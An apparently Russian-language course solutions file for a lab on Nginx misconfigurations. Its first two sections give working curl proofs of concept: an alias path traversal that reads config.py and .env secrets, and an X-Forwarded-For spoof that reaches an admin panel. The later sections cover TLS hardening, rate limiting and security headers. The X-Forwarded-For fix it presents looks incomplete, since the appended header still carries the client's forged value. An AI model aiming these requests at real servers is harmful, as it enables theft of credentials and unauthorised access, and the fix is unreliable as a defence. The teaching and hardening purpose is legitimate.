# 🎯 Решения и эталонные конфигурации к Модулю 07
## Web Infrastructure Exploitation, Nginx Misconfigurations & SSL Hardening

---

## 1. Решение Лабораторной работы 7.1: Эксплуатация и устранение Alias Traversal

### 1.1. Команды воспроизведения уязвимости (Proof of Concept)
Уязвимость вызвана отсутствием замыкающего слэша в директиве `location /static` при наличии слэша в `alias /tmp/college_linux_lab7/www/static/;`.

1. **Эксплуатация для чтения секретного файла конфигурации `config.py`**:
   ```bash
   curl -s -i "http://127.0.0.1:8080/static../config.py"
   ```
   **Ожидаемый ответ сервера**:
   ```http
   HTTP/1.1 200 OK
   Server: nginx
   Content-Type: text/x-python
   Content-Length: 532

   # ==============================================================================
   # КОНФИДЕНЦИАЛЬНАЯ КОНФИГУРАЦИЯ БЭКЕНДА (PRODUCTION SECRETS)
   # ==============================================================================
   FLAG = "FLAG{nginx_alias_traversal_lfi_source_code_leak_2026}"
   APP_SECRET_KEY = "sec_live_k98a12938fd89123bca01283"
   DATABASE_URI = "postgresql://fintech_prod_user:SuperSecretDbPass2026!@10.0.100.5:5432/core_banking"
   ...
   ```

2. **Эксплуатация для извлечения переменных окружения `.env`**:
   ```bash
   curl -s -i "http://127.0.0.1:8080/static../.env"
   ```
   **Результат**: извлечены боевые пароли к базе данных и секретный ключ подписи токенов JWT (`JWT_SECRET`).

### 1.2. Исправление конфигурации Nginx
Необходимо строго согласовать завершающие слэши в директивах `location` и `alias`:

```nginx
# ИСПРАВЛЕННЫЙ БЛОК:
location /static/ {
    alias /tmp/college_linux_lab7/www/static/;
}
```

### 1.3. Верификация исправления
```bash
curl -s -i "http://127.0.0.1:8080/static../config.py"
```
**Результат**:
```http
HTTP/1.1 404 Not Found
Server: nginx
Content-Type: text/html
Content-Length: 153
```
*Запрос `/static../` больше не сопоставляется с префиксом `/static/`, предотвращая выход за пределы папки со статикой.*

---

## 2. Решение Лабораторной работы 7.2: Спуфинг `X-Forwarded-For` и обход IP-Whitelist

### 2.1. Команды эксплуатации
1. **Прямое обращение к админ-панели (блокируется бэкендом)**:
   ```bash
   curl -s -i http://127.0.0.1:8080/admin
   ```
   **Ответ**:
   ```http
   HTTP/1.1 403 Forbidden
   Content-Type: application/json; charset=utf-8

   {
     "status": "DENIED",
     "error": "Forbidden: Client IP is not in whitelist",
     "hint": "Доступ разрешен только доверенному IP 127.0.0.1"
   }
   ```

2. **Обход проверки через внедрение поддельного адреса в заголовок `X-Forwarded-For`**:
   ```bash
   curl -s -i -H "X-Forwarded-For: 127.0.0.1" http://127.0.0.1:8080/admin
   ```
   **Ответ (Уязвимость подтверждена)**:
   ```http
   HTTP/1.1 200 OK
   Content-Type: application/json; charset=utf-8

   {
     "status": "AUTHORIZED",
     "access_level": "ROOT_ADMINISTRATOR",
     "effective_client_ip": "127.0.0.1",
     "flag": "FLAG{x_forwarded_for_ip_spoofed_admin_access_granted}",
     "sensitive_data": {
       "db_master_host": "10.0.50.12:5432",
       "db_superuser": "postgres_admin",
       "db_master_token": "pg_sec_token_98319fbc7412e"
     }
   }
   ```

### 2.2. Исправление конфигурации Nginx
Никогда не используйте переменную `$http_x_forwarded_for`, если входящий трафик поступает из недоверенного интернета.
Замените конфигурацию на защищенную:

```nginx
location /admin {
    proxy_pass http://127.0.0.1:8081/admin;
    proxy_set_header Host $host;
    
    # 1. Передаем реальный адрес сокета клиента
    proxy_set_header X-Real-IP $remote_addr;
    
    # 2. Дописываем реальный IP клиента в конец цепочки, исключая доверие первому элементу
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    
    # 3. Фиксируем схему
    proxy_set_header X-Forwarded-Proto $scheme;
}
```

### 2.3. Верификация
```bash
curl -s -i -H "X-Forwarded-For: 127.0.0.1" http://127.0.0.1:8080/admin
```
**Результат**: сервер возвращает `403 Forbidden`, так как реальный адрес сокета клиента корректно распознан и добавлен Nginx, предотвращая подмену.

---

## 3. Решение Лабораторной работы 7.3: Аудит TLS и Hardening до TLS 1.3 с PFS

### 3.1. Команды аудита устаревшего сервера
1. **Проверка уязвимого протокола TLS 1.1**:
   ```bash
   echo "Q" | openssl s_client -connect 127.0.0.1:8443 -tls1_1
   ```
   **Результат до исправления**:
   ```text
   CONNECTED(00000003)
   New, TLSv1.1, Cipher is AES256-SHA
   Server public key is 2048 bit
   ...
   ```
   *Соединение установлено. Сервер уязвим к атакам на CBC-режим и не гарантирует Perfect Forward Secrecy.*

### 3.2. Эталонная защищенная конфигурация SSL/TLS
Внесите следующие параметры в блок `server` (порт 8443):

```nginx
server {
    listen 8443 ssl http2;
    server_name secure.lab.local localhost;

    ssl_certificate     /Users/kodoku/Documents/College/Linux/07-web-services-and-reverse-proxy/starter_data/ssl/server.crt;
    ssl_certificate_key /Users/kodoku/Documents/College/Linux/07-web-services-and-reverse-proxy/starter_data/ssl/server.key;

    # 1. Отключение устаревших протоколов (SSLv3, TLS 1.0, TLS 1.1)
    ssl_protocols TLSv1.2 TLSv1.3;

    # 2. Шифры с поддержкой AEAD и Perfect Forward Secrecy (ECDHE)
    ssl_ciphers 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305';
    ssl_prefer_server_ciphers on;

    # 3. Настройка эллиптических кривых для обмена ключами
    ssl_ecdh_curve X25519:prime256v1:secp384r1;

    # 4. Безопасное управление сессиями (отключение билетов для гарантии PFS)
    ssl_session_timeout 1d;
    ssl_session_cache shared:SSL:10m;
    ssl_session_tickets off;

    # 5. Заголовок HSTS (HTTP Strict Transport Security)
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;

    location / {
        return 200 '{"status":"connected_over_hardened_tls","protocol":"$ssl_protocol","cipher":"$ssl_cipher"}\n';
        default_type application/json;
    }
}
```

### 3.3. Верификация
1. **Проверка отклонения TLS 1.1**:
   ```bash
   echo "Q" | openssl s_client -connect 127.0.0.1:8443 -tls1_1
   ```
   **Результат**: `handshake failure` или `alert protocol version`. Соединение сброшено.
2. **Проверка TLS 1.3**:
   ```bash
   echo "Q" | openssl s_client -connect 127.0.0.1:8443 -tls1_3
   ```
   **Результат**: `New, TLSv1.3, Cipher is TLS_AES_256_GCM_SHA384`. Рукопожатие выполнено за 1 RTT.

---

## 4. Решение Лабораторной работы 7.4: Двухзонный Rate Limiting и Security Headers

### 4.1. Полный эталонный конфигурационный файл `hardened_nginx.conf`

```nginx
events {
    worker_connections 2048;
}

http {
    include       /etc/nginx/mime.types;
    default_type  application/octet-stream;

    # 1. Отключение раскрытия информации о версии Nginx
    server_tokens off;

    # 2. Двухзонный Rate Limiting
    # Зона соединений: не более 10 одновременных сокетов на один IP
    limit_conn_zone $binary_remote_addr zone=conn_limit_ip:10m;

    # Зона общего API: 10 запросов в секунду
    limit_req_zone $binary_remote_addr zone=api_general_limit:10m rate=10r/s;

    # Зона эндпоинта логина: 2 запроса в секунду
    limit_req_zone $binary_remote_addr zone=auth_strict_limit:10m rate=2r/s;

    # Статус возврата при блокировке — 429 Too Many Requests
    limit_req_status 429;
    limit_conn_status 429;

    # 3. Виртуальный хост HTTP (порт 8080)
    server {
        listen 8080 default_server;
        server_name portal.lab.local localhost;

        # Ограничение одновременных соединений
        limit_conn conn_limit_ip 10;

        # Комплекс защитных заголовков (Security Headers)
        add_header Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self'; object-src 'none';" always;
        add_header X-Frame-Options "DENY" always;
        add_header X-Content-Type-Options "nosniff" always;
        add_header Referrer-Policy "strict-origin-when-cross-origin" always;
        add_header Permissions-Policy "geolocation=(), camera=(), microphone=()" always;

        # Исправленный Alias без уязвимости Traversal
        location /static/ {
            alias /tmp/college_linux_lab7/www/static/;
        }

        # Защищенный проброс для админки
        location /admin {
            proxy_pass http://127.0.0.1:8081/admin;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        }

        # Защита эндпоинта аутентификации от DoS и брутфорса
        location /api/login {
            limit_req zone=auth_strict_limit burst=2 nodelay;
            proxy_pass http://127.0.0.1:8081/api/login;
            proxy_set_header Host $host;
        }

        location /api/ {
            limit_req zone=api_general_limit burst=10 nodelay;
            proxy_pass http://127.0.0.1:8081/api/;
            proxy_set_header Host $host;
        }

        location / {
            root /tmp/college_linux_lab7/www;
            index index.html;
        }
    }

    # 4. Виртуальный хост HTTPS (порт 8443)
    server {
        listen 8443 ssl http2;
        server_name secure.lab.local localhost;

        ssl_certificate     /Users/kodoku/Documents/College/Linux/07-web-services-and-reverse-proxy/starter_data/ssl/server.crt;
        ssl_certificate_key /Users/kodoku/Documents/College/Linux/07-web-services-and-reverse-proxy/starter_data/ssl/server.key;

        ssl_protocols TLSv1.2 TLSv1.3;
        ssl_ciphers 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305';
        ssl_prefer_server_ciphers on;
        ssl_ecdh_curve X25519:prime256v1:secp384r1;

        ssl_session_timeout 1d;
        ssl_session_cache shared:SSL:10m;
        ssl_session_tickets off;

        add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
        add_header X-Frame-Options "DENY" always;
        add_header X-Content-Type-Options "nosniff" always;

        location / {
            return 200 '{"status":"connected_over_hardened_tls","protocol":"$ssl_protocol","cipher":"$ssl_cipher"}\n';
            default_type application/json;
        }
    }
}
```

### 4.2. Команды комплексной верификации
1. **Проверка защитных заголовков**:
   ```bash
   curl -s -I http://127.0.0.1:8080/api/public
   ```
   **Проверка**: убедитесь в наличии `Content-Security-Policy`, `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff` и отсутствии номера версии в `Server: nginx`.

2. **Нагрузочный тест Rate Limiting на `/api/login`**:
   ```bash
   for i in {1..8}; do
       curl -s -o /dev/null -w "%{http_code} " http://127.0.0.1:8080/api/login
   done
   echo ""
   ```
   **Ожидаемый вывод**:
   `200 200 429 429 429 429 429 429` (первые 2 запроса пропущены по буферу `burst=2`, последующие мгновенно отклонены кодом 429).

3. **Запуск скрипта автопроверки стенда**:
   ```bash
   bash starter_data/exploit_test.sh
   ```
   Все 4 теста должны получить статус `[SECURED]`.
